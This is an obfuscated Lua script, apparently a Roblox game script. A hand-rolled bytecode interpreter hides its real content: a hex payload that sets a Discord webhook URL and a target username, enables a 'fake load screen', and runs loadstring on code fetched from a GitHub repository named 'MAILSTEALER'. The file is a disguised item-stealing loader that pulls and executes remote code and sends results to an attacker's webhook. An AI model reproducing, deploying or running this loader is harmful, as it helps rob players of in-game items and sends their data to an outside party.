--with love Mouhammed

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 79) then
			local v81 = 0;
			while true do
				if (v81 == 0) then
					v19 = v0(v3(v30, 1, 1));
					return "";
				end
			end
		else
			local v82 = v2(v0(v30, 16));
			if v19 then
				local v88 = 0;
				local v89;
				while true do
					if (v88 == 1) then
						return v89;
					end
					if (v88 == 0) then
						v89 = v5(v82, v19);
						v19 = nil;
						v88 = 1;
					end
				end
			else
				return v82;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v83 = (v31 / ((5 - 3) ^ (v32 - 1))) % ((5 - (1640 - (1523 + 114))) ^ (((v33 - (1 - (0 + 0))) - (v32 - ((2 - 0) - 1))) + (620 - (555 + (1129 - (68 + 997))))));
			return v83 - (v83 % ((2202 - (226 + 1044)) - (857 + 74)));
		else
			local v84 = (2473 - 1905) - (367 + 201);
			local v85;
			while true do
				if (v84 == (927 - (214 + 713))) then
					v85 = 2 ^ (v32 - (1 + (117 - (32 + 85))));
					return (((v31 % (v85 + v85)) >= v85) and (1 + 0)) or (877 - (282 + 595));
				end
			end
		end
	end
	local function v21()
		local v34 = v1(v16, v18, v18);
		v18 = v18 + 1;
		return v34;
	end
	local function v22()
		local v35 = 0 + (0 - 0);
		local v36;
		local v37;
		while true do
			if (v35 == 1) then
				return (v37 * (57 + 199)) + v36;
			end
			if (v35 == (957 - (892 + (415 - (87 + 263))))) then
				v36, v37 = v1(v16, v18, v18 + (4 - 2));
				v18 = v18 + 2;
				v35 = 1 - 0;
			end
		end
	end
	local function v23()
		local v38, v39, v40, v41 = v1(v16, v18, v18 + (7 - 4));
		v18 = v18 + (184 - (67 + 113));
		return (v41 * (12302277 + 4474939)) + (v40 * (260471 - 194935)) + (v39 * (1208 - (802 + (403 - 253)))) + v38;
	end
	local function v24()
		local v42 = v23();
		local v43 = v23();
		local v44 = 1 - 0;
		local v45 = (v20(v43, 1 + 0, 63 - 43) * ((999 - ((1774 - (814 + 45)) + 82)) ^ (90 - 58))) + v42;
		local v46 = v20(v43, 13 + 8, (98 - 58) - 9);
		local v47 = ((v20(v43, (4 + 52) - 24) == (1188 - (378 + 691 + 118))) and -(431 - (44 + 386))) or (1487 - (998 + 488));
		if (v46 == (0 - 0)) then
			if (v45 == (0 + 0)) then
				return v47 * (0 - 0);
			else
				v46 = 1 + (885 - (261 + 624));
				v44 = 0 - 0;
			end
		elseif (v46 == (2031 + 16)) then
			return ((v45 == ((1405 - 614) - (368 + 423))) and (v47 * ((3 - 2) / (0 + 0)))) or (v47 * NaN);
		end
		return v8(v47, v46 - (1041 - (10 + 8))) * (v44 + (v45 / ((7 - 5) ^ 52)));
	end
	local function v25(v48)
		local v49 = 1080 - (1020 + 60);
		local v50;
		local v51;
		while true do
			if (v49 == (1426 - (630 + 793))) then
				return v6(v51);
			end
			if (v49 == (6 - 4)) then
				v51 = {};
				for v90 = (1 + 3) - 3, #v50 do
					v51[v90] = v2(v1(v3(v50, v90, v90)));
				end
				v49 = 2 + 0 + 1;
			end
			if (v49 == (3 - 2)) then
				v50 = v3(v16, v18, (v18 + v48) - 1);
				v18 = v18 + v48;
				v49 = 1057 - (87 + 968);
			end
			if (v49 == (1747 - ((2981 - 2221) + (4344 - 3357)))) then
				v50 = nil;
				if not v48 then
					local v96 = 1913 - (1789 + 124);
					while true do
						if (v96 == (766 - (745 + 21))) then
							v48 = v23();
							if (v48 == (0 + 0)) then
								return "";
							end
							break;
						end
					end
				end
				v49 = 2 - 1;
			end
		end
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v52 = 0;
		local v53;
		local v54;
		local v55;
		local v56;
		local v57;
		local v58;
		local v59;
		local v60;
		while true do
			if (v52 ~= (784 - (162 + 618))) then
			else
				while true do
					if (v53 == (1 + 0)) then
						v56 = nil;
						v57 = nil;
						v53 = 2 + 0;
					end
					if (v53 ~= 2) then
					else
						local v99 = 0;
						while true do
							if (1 ~= v99) then
							else
								v53 = 6 - 3;
								break;
							end
							if (v99 ~= 0) then
							else
								v58 = nil;
								v59 = nil;
								v99 = 1 - 0;
							end
						end
					end
					if ((0 + 0) == v53) then
						local v100 = 1636 - (1373 + 263);
						while true do
							if (1 ~= v100) then
							else
								v53 = 1;
								break;
							end
							if (v100 == (1000 - (451 + 549))) then
								v54 = 0 + 0;
								v55 = nil;
								v100 = 1;
							end
						end
					end
					if (v53 ~= (4 - 1)) then
					else
						v60 = nil;
						while true do
							local v101 = 0;
							while true do
								if (v101 == (0 - 0)) then
									if (v54 == (1385 - (746 + 638))) then
										local v102 = 0;
										while true do
											if (0 ~= v102) then
											else
												v59 = v23();
												v60 = {};
												v102 = 1 + 0;
											end
											if (v102 == (2 - 0)) then
												v54 = 2;
												break;
											end
											if (v102 == 1) then
												for v163 = 342 - (218 + 123), v59 do
													local v164 = 1581 - (1535 + 46);
													local v165;
													local v166;
													local v167;
													while true do
														if (v164 ~= (0 + 0)) then
														else
															local v188 = 0 + 0;
															while true do
																if (v188 == 1) then
																	v164 = 1;
																	break;
																end
																if (v188 == (560 - (306 + 254))) then
																	v165 = 0;
																	v166 = nil;
																	v188 = 1;
																end
															end
														end
														if (1 ~= v164) then
														else
															v167 = nil;
															while true do
																if (v165 ~= (0 + 0)) then
																else
																	local v189 = 0 - 0;
																	local v190;
																	while true do
																		if (v189 == 0) then
																			v190 = 1467 - (899 + 568);
																			while true do
																				if (v190 == (0 + 0)) then
																					local v198 = 0;
																					while true do
																						if (v198 == 1) then
																							v190 = 1;
																							break;
																						end
																						if (v198 == 0) then
																							v166 = v21();
																							v167 = nil;
																							v198 = 1;
																						end
																					end
																				end
																				if (v190 ~= (2 - 1)) then
																				else
																					v165 = 604 - (268 + 335);
																					break;
																				end
																			end
																			break;
																		end
																	end
																end
																if (v165 ~= (291 - (60 + 230))) then
																else
																	if (v166 == (573 - (426 + 146))) then
																		v167 = v21() ~= (0 + 0);
																	elseif (v166 == (1458 - (282 + 1174))) then
																		v167 = v24();
																	elseif (v166 ~= (814 - (569 + 242))) then
																	else
																		v167 = v25();
																	end
																	v60[v163] = v167;
																	break;
																end
															end
															break;
														end
													end
												end
												v58[3] = v21();
												v102 = 2;
											end
										end
									end
									if (v54 ~= (5 - 3)) then
									else
										local v103 = 0;
										local v104;
										while true do
											if (v103 == 0) then
												v104 = 0 + 0;
												while true do
													if (v104 ~= (1025 - (706 + 318))) then
													else
														return v58;
													end
													if (v104 ~= 0) then
													else
														local v186 = 1251 - (721 + 530);
														local v187;
														while true do
															if (v186 == 0) then
																v187 = 0;
																while true do
																	if (v187 ~= 0) then
																	else
																		for v192 = 1272 - (945 + 326), v23() do
																			local v193 = 0 - 0;
																			local v194;
																			local v195;
																			while true do
																				if (v193 ~= (0 + 0)) then
																				else
																					v194 = 700 - (271 + 429);
																					v195 = nil;
																					v193 = 1 + 0;
																				end
																				if (v193 ~= 1) then
																				else
																					while true do
																						if (v194 == (1500 - (1408 + 92))) then
																							v195 = v21();
																							if (v20(v195, 1, 1) ~= (1086 - (461 + 625))) then
																							else
																								local v199 = 1288 - (993 + 295);
																								local v200;
																								local v201;
																								local v202;
																								local v203;
																								while true do
																									if (v199 == (0 + 0)) then
																										v200 = 1171 - (418 + 753);
																										v201 = nil;
																										v199 = 1 + 0;
																									end
																									if (v199 == (1 + 1)) then
																										while true do
																											if (v200 ~= (1 + 0)) then
																											else
																												local v204 = 0 + 0;
																												while true do
																													if (v204 == (529 - (406 + 123))) then
																														v203 = {v22(),v22(),nil,nil};
																														if (v201 == (1322 - (1249 + 73))) then
																															local v210 = 0;
																															local v211;
																															while true do
																																if (v210 ~= (0 + 0)) then
																																else
																																	v211 = 1145 - (466 + 679);
																																	while true do
																																		if (v211 == 0) then
																																			v203[6 - 3] = v22();
																																			v203[4] = v22();
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														elseif (v201 == 1) then
																															v203[8 - 5] = v23();
																														elseif (v201 == 2) then
																															v203[1903 - (106 + 1794)] = v23() - (2 ^ 16);
																														elseif (v201 == (1 + 2)) then
																															local v220 = 0;
																															local v221;
																															local v222;
																															while true do
																																if (v220 ~= (0 + 0)) then
																																else
																																	v221 = 0;
																																	v222 = nil;
																																	v220 = 1;
																																end
																																if (v220 ~= 1) then
																																else
																																	while true do
																																		if (0 ~= v221) then
																																		else
																																			v222 = 0 - 0;
																																			while true do
																																				if (v222 == (0 - 0)) then
																																					v203[3] = v23() - (2 ^ (130 - (4 + 110)));
																																					v203[4] = v22();
																																					break;
																																				end
																																			end
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														end
																														v204 = 585 - (57 + 527);
																													end
																													if ((1428 - (41 + 1386)) ~= v204) then
																													else
																														v200 = 105 - (17 + 86);
																														break;
																													end
																												end
																											end
																											if (v200 == (0 + 0)) then
																												local v205 = 0 - 0;
																												while true do
																													if (v205 ~= 1) then
																													else
																														v200 = 1;
																														break;
																													end
																													if (v205 ~= (0 - 0)) then
																													else
																														v201 = v20(v195, 168 - (122 + 44), 3);
																														v202 = v20(v195, 4, 6);
																														v205 = 1;
																													end
																												end
																											end
																											if (v200 == (2 - 0)) then
																												local v206 = 0;
																												while true do
																													if ((3 - 2) == v206) then
																														v200 = 3;
																														break;
																													end
																													if (v206 == 0) then
																														if (v20(v202, 1 + 0, 1) ~= (1 + 0)) then
																														else
																															v203[2] = v60[v203[3 - 1]];
																														end
																														if (v20(v202, 2, 67 - (30 + 35)) ~= 1) then
																														else
																															v203[3 + 0] = v60[v203[1260 - (1043 + 214)]];
																														end
																														v206 = 3 - 2;
																													end
																												end
																											end
																											if ((1215 - (323 + 889)) == v200) then
																												if (v20(v202, 3, 3) ~= 1) then
																												else
																													v203[4] = v60[v203[10 - 6]];
																												end
																												v55[v192] = v203;
																												break;
																											end
																										end
																										break;
																									end
																									if (1 == v199) then
																										v202 = nil;
																										v203 = nil;
																										v199 = 2;
																									end
																								end
																							end
																							break;
																						end
																					end
																					break;
																				end
																			end
																		end
																		for v196 = 581 - (361 + 219), v23() do
																			v56[v196 - (321 - (53 + 267))] = v28();
																		end
																		v187 = 1 + 0;
																	end
																	if ((414 - (15 + 398)) == v187) then
																		v104 = 983 - (18 + 964);
																		break;
																	end
																end
																break;
															end
														end
													end
												end
												break;
											end
										end
									end
									v101 = 3 - 2;
								end
								if (v101 == (1 + 0)) then
									if (v54 ~= 0) then
									else
										local v105 = 0 + 0;
										while true do
											if (v105 == (851 - (20 + 830))) then
												local v149 = 0 + 0;
												while true do
													if (v149 ~= (126 - (116 + 10))) then
													else
														v57 = {};
														v58 = {v55,v56,nil,v57};
														v149 = 1 + 0;
													end
													if (v149 == (1 + 0)) then
														v105 = 2;
														break;
													end
												end
											end
											if (v105 ~= (4 - 2)) then
											else
												v54 = 2 - 1;
												break;
											end
											if (v105 == 0) then
												local v150 = 1551 - (1126 + 425);
												local v151;
												while true do
													if (0 ~= v150) then
													else
														v151 = 405 - (118 + 287);
														while true do
															if (0 ~= v151) then
															else
																v55 = {};
																v56 = {};
																v151 = 3 - 2;
															end
															if (v151 == 1) then
																v105 = 1;
																break;
															end
														end
														break;
													end
												end
											end
										end
									end
									break;
								end
							end
						end
						break;
					end
				end
				break;
			end
			if (v52 == 3) then
				v59 = nil;
				v60 = nil;
				v52 = 4;
			end
			if (v52 == (1123 - (118 + 1003))) then
				v57 = nil;
				v58 = nil;
				v52 = 3;
			end
			if (v52 ~= (2 - 1)) then
			else
				v55 = nil;
				v56 = nil;
				v52 = 2;
			end
			if (v52 == 0) then
				v53 = 0;
				v54 = nil;
				v52 = 1;
			end
		end
	end
	local function v29(v61, v62, v63)
		local v64 = v61[1];
		local v65 = v61[2];
		local v66 = v61[3];
		return function(...)
			local v67 = v64;
			local v68 = v65;
			local v69 = v66;
			local v70 = v27;
			local v71 = 1;
			local v72 = -1;
			local v73 = {};
			local v74 = {...};
			local v75 = v12("#", ...) - 1;
			local v76 = {};
			local v77 = {};
			for v86 = 0, v75 do
				if (v86 >= v69) then
					v73[v86 - v69] = v74[v86 + 1];
				else
					v77[v86] = v74[v86 + 1];
				end
			end
			local v78 = (v75 - v69) + 1;
			local v79;
			local v80;
			while true do
				local v87 = 0;
				while true do
					if (v87 == 1) then
						if (v80 <= 7) then
							if (v80 <= 3) then
								if (v80 <= 1) then
									if (v80 > 0) then
										for v140 = v79[2], v79[3] do
											v77[v140] = nil;
										end
									else
										local v106 = 0;
										local v107;
										local v108;
										while true do
											if (v106 == 0) then
												v107 = v79[2];
												v108 = v77[v79[3]];
												v106 = 1;
											end
											if (v106 == 1) then
												v77[v107 + 1] = v108;
												v77[v107] = v108[v79[4]];
												break;
											end
										end
									end
								elseif (v80 == 2) then
									local v109 = 0;
									local v110;
									while true do
										if (v109 == 0) then
											v110 = v79[2];
											v77[v110] = v77[v110](v13(v77, v110 + 1, v72));
											break;
										end
									end
								elseif (v77[v79[2]] == v79[4]) then
									v71 = v71 + 1;
								else
									v71 = v79[3];
								end
							elseif (v80 <= 5) then
								if (v80 > 4) then
									v77[v79[2]] = v79[3] ~= 0;
								else
									v63[v79[3]] = v77[v79[2]];
								end
							elseif (v80 == 6) then
								local v114;
								local v115, v116;
								local v117;
								local v118;
								v63[v79[3]] = v77[v79[2]];
								v71 = v71 + 1;
								v79 = v67[v71];
								if ((v79[3] == "_ENV") or (v79[3] == "getfenv")) then
									v77[v79[2]] = v63;
								else
									v77[v79[2]] = v63[v79[3]];
								end
								v71 = v71 + 1;
								v79 = v67[v71];
								if ((v79[3] == "_ENV") or (v79[3] == "getfenv")) then
									v77[v79[2]] = v63;
								else
									v77[v79[2]] = v63[v79[3]];
								end
								v71 = v71 + 1;
								v79 = v67[v71];
								v118 = v79[2];
								v117 = v77[v79[3]];
								v77[v118 + 1] = v117;
								v77[v118] = v117[v79[4]];
								v71 = v71 + 1;
								v79 = v67[v71];
								v77[v79[2]] = v79[3];
								v71 = v71 + 1;
								v79 = v67[v71];
								v118 = v79[2];
								v115, v116 = v70(v77[v118](v13(v77, v118 + 1, v79[3])));
								v72 = (v116 + v118) - 1;
								v114 = 0;
								for v142 = v118, v72 do
									v114 = v114 + 1;
									v77[v142] = v115[v114];
								end
								v71 = v71 + 1;
								v79 = v67[v71];
								v118 = v79[2];
								v77[v118] = v77[v118](v13(v77, v118 + 1, v72));
								v71 = v71 + 1;
								v79 = v67[v71];
								v77[v79[2]]();
								v71 = v71 + 1;
								v79 = v67[v71];
								v71 = v79[3];
							else
								v71 = v79[3];
							end
						elseif (v80 <= 11) then
							if (v80 <= 9) then
								if (v80 == 8) then
									v77[v79[2]]();
								else
									local v129 = v79[2];
									local v130, v131 = v70(v77[v129](v13(v77, v129 + 1, v79[3])));
									v72 = (v131 + v129) - 1;
									local v132 = 0;
									for v145 = v129, v72 do
										v132 = v132 + 1;
										v77[v145] = v130[v132];
									end
								end
							elseif (v80 == 10) then
								if ((v79[3] == "_ENV") or (v79[3] == "getfenv")) then
									v77[v79[2]] = v63;
								else
									v77[v79[2]] = v63[v79[3]];
								end
							else
								do
									return;
								end
							end
						elseif (v80 <= 13) then
							if (v80 == 12) then
								v63[v79[3]] = v77[v79[2]];
								v71 = v71 + 1;
								v79 = v67[v71];
								v77[v79[2]] = v79[3] ~= 0;
								v71 = v71 + 1;
								v79 = v67[v71];
								v63[v79[3]] = v77[v79[2]];
								v71 = v71 + 1;
								v79 = v67[v71];
								v77[v79[2]] = v79[3];
								v71 = v71 + 1;
								v79 = v67[v71];
								v71 = v79[3];
							else
								local v137 = 0;
								while true do
									if (v137 == 1) then
										v71 = v71 + 1;
										v79 = v67[v71];
										v63[v79[3]] = v77[v79[2]];
										v71 = v71 + 1;
										v137 = 2;
									end
									if (v137 == 2) then
										v79 = v67[v71];
										v77[v79[2]] = v79[3];
										v71 = v71 + 1;
										v79 = v67[v71];
										v137 = 3;
									end
									if (v137 == 0) then
										v63[v79[3]] = v77[v79[2]];
										v71 = v71 + 1;
										v79 = v67[v71];
										v77[v79[2]] = v79[3];
										v137 = 1;
									end
									if (v137 == 3) then
										v71 = v79[3];
										break;
									end
								end
							end
						elseif (v80 == 14) then
							v77[v79[2]] = v79[3];
						elseif (v79[2] == v77[v79[4]]) then
							v71 = v71 + 1;
						else
							v71 = v79[3];
						end
						v71 = v71 + 1;
						break;
					end
					if (v87 == 0) then
						v79 = v67[v71];
						v80 = v79[1];
						v87 = 1;
					end
				end
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
v15("LOL!0F3O00028O00026O00F03F03083O00557365726E616D6503073O006974737261767503073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O31392O33313639362O3430383530343332312F77554F5F496F654438797A6C676543386F6B434E535533714D6B4E536D6451726E6C626D383764577366714E5576624F5234766F635F494E55657A2D694757666A69724F027O004003073O004D61696C6D736703023O00457A030E3O0046616B654C6F61645363722O656E031B3O0046616B655F4875625F49665F4E6F745F456E6F7567685F47656D73030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403453O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F504F2O4745525A31352F4D41494C535445414C45522F6D61696E2F4D61696E2E6C756100333O00120E3O00014O0001000100013O0026033O0002000100010004073O0002000100120E000100013O00260300010014000100010004073O0014000100120E000200013O000E0F0002000C000100020004073O000C000100120E000100023O0004073O0014000100260300020008000100010004073O0008000100120E000300043O00120D000300033O00122O000300063O00122O000300053O00122O000200023O00044O0008000100260300010023000100020004073O0023000100120E000200013O0026030002001B000100020004073O001B000100120E000100073O0004073O00230001000E0F00010017000100020004073O0017000100120E000300093O00120C000300086O000300013O00122O0003000A3O00122O000200023O00044O0017000100260300010005000100070004073O000500012O0005000200013O0012060002000B3O00122O0002000C3O00122O0003000D3O00202O00030003000E00122O0005000F6O000300056O00023O00024O00020001000100044O003200010004073O000500010004073O003200010004073O000200012O000B3O00017O00", v9(), ...);
